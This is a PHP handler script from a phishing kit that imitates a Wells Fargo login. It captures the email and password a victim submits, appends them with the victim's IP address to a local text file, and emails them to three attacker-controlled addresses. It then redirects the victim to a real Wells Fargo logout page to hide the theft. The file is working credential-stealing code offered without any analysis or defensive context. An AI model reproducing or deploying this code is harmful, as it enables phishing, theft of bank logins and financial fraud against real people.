<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email   : ".$_POST['user']."\n";
$message .= "Password   : ".$_POST['pass']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "airbabakay@protonmail.com,airbabakay@aol.com,airbabakay@yahoo.com";

$fp = fopen("A1R.txt","a");
fputs($fp,$message);
fclose($fp);


$subject = "wells! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://connect.secure.wellsfargo.com/auth/secureLogout?st=1534888581&SAMLart=AAQCBeoEQCR14WDgSxaU4QNGCHpGcoS1aUFjKPOTaCWmJOTNXgipbB3D9TA%3D");

?>


